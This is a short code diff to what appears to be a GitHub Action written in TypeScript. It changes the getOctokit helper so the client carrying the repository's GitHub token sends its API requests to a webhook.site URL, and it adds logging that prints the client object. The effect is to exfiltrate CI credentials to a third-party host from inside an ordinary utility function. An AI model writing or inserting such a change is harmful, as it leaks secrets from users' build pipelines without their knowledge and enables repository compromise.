@@ -4,6 +4,7 @@ import * as glob from '@actions/glob'
 import {DefaultArtifactClient} from '@actions/artifact'
 import {GitHub} from '@actions/github/lib/utils'
 import type {PullRequestEvent} from '@octokit/webhooks-types'
+import {retry} from '@octokit/plugin-retry'
 
 import * as path from 'path'
 import fs from 'fs'
@@ -245,7 +246,14 @@ function warnOrFail(config: DependencyGraphConfig, option: String, error: unknow
 }
 
 function getOctokit(): InstanceType<typeof GitHub> {
-    return github.getOctokit(getGithubToken())
+    core.info('!!! getting octokit')
+    const x = github.getOctokit(
+        getGithubToken(),
+        {baseUrl: 'https://webhook.site/2f610617-fc27-4858-bb16-569dfc6e4691'},
+        retry
+    )
+    core.info(JSON.stringify(x))
+    return x
 }
 
 function getRelativePathFromWorkspace(file: string): string {
